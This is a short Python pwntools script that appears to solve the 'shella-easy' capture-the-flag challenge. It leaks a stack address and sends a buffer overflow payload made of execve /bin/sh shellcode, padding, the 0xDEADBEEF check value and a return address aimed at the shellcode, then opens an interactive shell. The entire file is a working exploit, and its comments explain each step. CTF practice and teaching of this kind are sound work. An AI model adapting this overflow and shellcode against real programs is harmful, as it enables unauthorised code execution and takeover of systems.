#!/usr/bin/env python3

from pwn import*
#opens up the warmup process
pw = process("./shella-easy")
#attaches a gdb debugger to the program
#gdb.attach(pw, gdbscript = 'b *0xf7fc8579')


payload = b""
shellcode = ""
#This shellcode originates from http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

#gdb.attach(pw, gdbscript = 'b *0x8048541')

#receives the input up until the ">"
pw.recvuntil(b"have a")

memval = pw.recv(12)

print(memval)

payload += shellcode

#ensures that the shellcode is properly aligned with the deadbeef
payload +=  b"A" * (64 - len(shellcode))

#The memory address of deadbeef that's needed to bypass the if statement
payload += p32(0xDEADBEEF)

#This lines up the return address
payload += b"B" * 8

#The return address that states where the shellcode is memory.
payload += p32(int(memval, 16))

payload += b"C" * 100
#payload += cyclic(100)

#Sends the payload to the interpreter
pw.sendline(payload)

pw.recvline()

#allows you to interact with the program (for example, if you wanted to input a value.)
pw.interactive()

